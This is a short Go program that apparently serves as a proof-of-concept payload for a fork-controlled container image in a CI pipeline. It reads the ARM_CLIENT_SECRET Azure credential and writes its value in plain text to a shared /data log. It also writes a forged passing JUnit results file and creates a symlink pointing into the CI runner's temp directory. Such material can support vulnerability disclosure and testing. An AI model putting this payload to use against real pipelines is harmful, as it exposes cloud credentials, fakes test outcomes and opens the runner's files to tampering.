package main

import (
	"fmt"
	"os"
)

func must(err error) {
	if err != nil {
		panic(err)
	}
}

func main() {
	direct := "ARM_CLIENT_SECRET=ABSENT"
	if value, ok := os.LookupEnv("ARM_CLIENT_SECRET"); ok {
		direct = "ARM_CLIENT_SECRET=PRESENT:" + value
	}
	must(os.WriteFile("/data/direct-env-check.log", []byte(direct+"\n"), 0o644))
	must(os.WriteFile("/data/payload-executed.log", []byte("fork-controlled OCI payload executed\n"), 0o644))
	must(os.WriteFile("/data/results.xml", []byte(`<?xml version="1.0" encoding="UTF-8"?>
<testsuite name="dummy-validation" tests="1" failures="0">
  <testcase classname="dummy" name="fork-controlled-image"/>
</testsuite>
`), 0o644))

	link := "/data/runner-temp.results"
	_ = os.Remove(link)
	must(os.Symlink("/home/runner/work/_temp", link))
	fmt.Println("created", link, "-> /home/runner/work/_temp")
}
